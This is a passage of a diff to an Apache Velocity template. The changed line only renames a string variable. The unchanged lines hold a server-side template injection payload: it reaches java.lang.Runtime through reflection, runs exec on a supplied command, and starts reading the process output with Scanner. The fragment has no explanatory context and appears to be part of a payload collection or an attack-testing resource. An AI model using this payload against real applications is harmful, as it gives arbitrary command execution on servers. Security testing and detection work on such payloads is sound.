@@ -1,4 +1,4 @@
-#set ($e="exp")
+#set ($e="e")
 #set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))
 #set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
 #set($sc = $e.getClass().forName("java.util.Scanner"))
